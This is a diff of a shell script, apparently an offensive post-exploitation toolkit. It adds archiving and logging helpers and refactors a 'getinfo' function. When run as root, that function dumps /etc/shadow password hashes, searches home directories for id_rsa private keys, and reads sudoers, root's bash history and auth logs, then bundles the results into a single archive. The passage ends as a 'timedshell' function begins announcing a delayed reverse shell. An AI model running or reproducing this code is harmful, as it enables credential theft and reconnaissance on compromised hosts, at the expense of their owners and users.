@@ -172,6 +172,50 @@ orc_makeHome() {
   }
 
 
+orc_archive () {
+  # Archive a directory content in a file.
+  # Uses tar, zip or ar.
+  # Arguments: Base name of the archive file.
+  #            Directory to archive.
+  # Return:    0 if and only if archive file creation was ok.
+  # Globals:   Set ORC_ARCHIV_FILE to the name of the created file.
+  if [ $# -ne 2 ]; then
+    echo 'archiver needs two arguments'
+    return 1
+  fi
+  if [ ! -d "$2" ] || [ ! -r "$2" ]; then
+    echo "Error, archiver can not read $2"
+    return 1
+  fi
+  # Now no archive file exists. Reset any old content.
+  ORC_ARCHIVE_FILE=""
+  if orc_existsProg tar; then
+    # try tar with internal xz compression
+    tar -cJf "$1.tar.xz" "$2" && ORC_ARCHIVE_FILE="$1.tar.xz"
+    if [ -z "$ORC_ARCHIVE_FILE" ] && orc_existsProg xz; then
+      # try tar with external xz compression
+      { tar -cf "$1.tar" "$2" && xz -9 "$1.tar" && ORC_ARCHIVE_FILE="$1.tar.xz"; } || rm "$1.tar"
+    fi
+    if [ -z "$ORC_ARCHIVE_FILE" ]; then
+      # try the old gzip inside tar
+      tar -czf "$1.tar.gz" "$2" && ORC_ARCHIVE_FILE="$1.tar.gz"
+    fi
+    if [ -z "$ORC_ARCHIVE_FILE" ]; then
+      # try tar without compression
+      tar -cf "$1.tar" "$2" && ORC_ARCHIVE_FILE="$1.tar"
+    fi
+  fi
+  if [ -z "$ORC_ARCHIVE_FILE" ] && orc_existsProg zip; then
+    # try to zip the files
+    zip -9Xrq "$1.zip" "$2" && ORC_ARCHIVE_FILE="$1.zip"
+  fi
+  if [ -z "$ORC_ARCHIVE_FILE" ]; then
+    echo 'Error, no working archive tool found'
+    return 1
+  fi
+}
+
+
 # ~~~ Helper Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #
 # In the section of the internal helper functions are collected.
@@ -261,6 +305,30 @@ orc_httpsProxyReminder() {
   return 0
 }
 
+orc_log2outp() {
+  # Runs a command and writes output to files in $OUTP.
+  # arguments: basename command command-arguments
+  # outputs: pipes stdout into $OUTP/basename.txt
+  #          pipes stderr into $OUTP/basename.err
+  #          logs basename and command call in $OUTP/log.txt
+  if [ ! -d "$OUTP" ]; then
+    echo 'output directory not defined or prepared'
+    return 1
+  fi
+  if [ $# -lt 1 ]; then
+    echo 'missing basename of the output files'
+    return 1
+  fi
+  echo "$@" >> "$OUTP/log.txt"
+  basename=$1
+  shift
+  if [ $# -lt 1 ]; then
+    echo 'missing command to execute'
+    return 1
+  fi
+  "$@" >> "$OUTP/$basename.txt" 2>> "$OUTP/$basename.err"
+}
+
 # ~~~ User Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #
 # The user functions are designed to be called by the o.rc users.
@@ -289,6 +357,7 @@ type aa-status >/dev/null 2>/dev/null
 	fi
 }
 
+
 log2outp() {
   # Runs a command and writes output to files in $OUTP.
   # arguments: basename command command-arguments
@@ -313,69 +382,67 @@ log2outp() {
   "$@" >> "$OUTP/$basename.txt" 2>> "$OUTP/$basename.err"
 }
 
+
 getinfo() {
   echo "Gathering useful command output."
-  echo "Find it in $HOME/f.tar.xz"
+  # Collect output files in $OUTP
   OUTP=$HOME/files/
   mkdir --mode 700 "$OUTP"
-  log2outp passwd getent passwd
-  log2outp uname uname -a
-  log2outp ps ps -weFH
-  log2outp w w
-  log2outp last last -i
-  log2outp uptime uptime
-  log2outp id id
-  log2outp date date
-  log2outp cpuinfo cat /proc/cpuinfo
-  log2outp free free -g
-  log2outp route route -n
-  log2outp hosts cat /etc/hosts
-  log2outp resolve cat /etc/resolv.conf
-  log2outp rpcinfo rpcinfo
-  log2outp lsmod lsmod
-  log2outp lsusb lsusb
-  log2outp mount mount
-  log2outp df df
-  log2outp user_crontab crontab -l
+  orc_log2outp passwd getent passwd
+  orc_log2outp uname uname -a
+  orc_log2outp ps ps -weFH
+  orc_log2outp w w
+  orc_log2outp last last -i
+  orc_log2outp uptime uptime
+  orc_log2outp id id
+  orc_log2outp date date
+  orc_log2outp cpuinfo cat /proc/cpuinfo
+  orc_log2outp free free -g
+  orc_log2outp route route -n
+  orc_log2outp hosts cat /etc/hosts
+  orc_log2outp resolve cat /etc/resolv.conf
+  orc_log2outp rpcinfo rpcinfo
+  orc_log2outp lsmod lsmod
+  orc_log2outp lsusb lsusb
+  orc_log2outp mount mount
+  orc_log2outp df df
+  orc_log2outp user_crontab crontab -l
   if hash ifconfig 2>/dev/null; then
-    log2outp ifconfig ifconfig -a
+    orc_log2outp ifconfig ifconfig -a
   else
-    log2outp ifconfig ip link
+    orc_log2outp ifconfig ip link
   fi
-  log2outp netstat netstat -peanut
+  orc_log2outp netstat netstat -peanut
   if [ "$EUID" = "0" ] || [ -O "/root" ]; then
     # Variable EUID is defined in the bash.
     # Check EUID of /root works in dash (and in bash).
-    log2outp shadow getent shadow
-    log2outp ssh_keys find /home/ -name id_rsa
-    log2outp sudoers cat /etc/sudoers
-    log2outp crontab cat /etc/crontab
-    log2outp iptables iptables -L
-    log2outp secure cat /var/log/secure
-    log2outp roothist cat /root/.bash_history
-    log2outp sshd_config cat /etc/ssh/sshd_config
-    log2outp root_dir ls -al /root/
+    orc_log2outp shadow getent shadow
+    orc_log2outp ssh_keys find /home/ -name id_rsa
+    orc_log2outp sudoers cat /etc/sudoers
+    orc_log2outp crontab cat /etc/crontab
+    orc_log2outp iptables iptables -L
+    orc_log2outp secure cat /var/log/secure
+    orc_log2outp roothist cat /root/.bash_history
+    orc_log2outp sshd_config cat /etc/ssh/sshd_config
+    orc_log2outp root_dir ls -al /root/
     #inelegant hack
-    log2outp netstat netstat -peanut
-    if hash getsebool 2>/dev/null; then
-      log2outp sellinux getenforce
-      log2outp sellinux getsebool -a
-      log2outp sellinux sestatus
+    orc_log2outp netstat netstat -peanut
+    if orc_existsProg getsebool; then
+      orc_log2outp sellinux getenforce
+      orc_log2outp sellinux getsebool -a
+      orc_log2outp sellinux sestatus
     fi
   fi
-  # Stores all log files in one compressed tar archive.
-  tar -cJf "$HOME/f.tar.xz" "$OUTP"
-  if [ $? -gt 0 ]; then
-    # maybe the tar internal xz fail. Try an external xz compression.
-    tar -cf - "$OUTP" | xz -c -9 > "$HOME/f.tar.xz"
+  # Stores all single log files in one archive file.
+  if orc_archive "$HOME/f" "$OUTP"; then
+    echo "Find the output files in $ORC_ARCHIVE_FILE"
+    # Remove the single log files. Keep only the archive file.
+    rm -rf "$OUTP"
+  else
+    echo "Error, can not archive, the files are in $OUTP"
   fi
-  if [ $? -gt 0 ]; then
-    # maybe xz command failed. Try the old gzip inside tar
-    tar -czf "$HOME/f.tar.gz" "$OUTP"
-  fi
-  # Remove the single log files. Keep only the archive file.
-  rm -rf "$OUTP"
 }
+
 
 timedshell() { 
 echo "scheduling a reverse shell to launch later..."
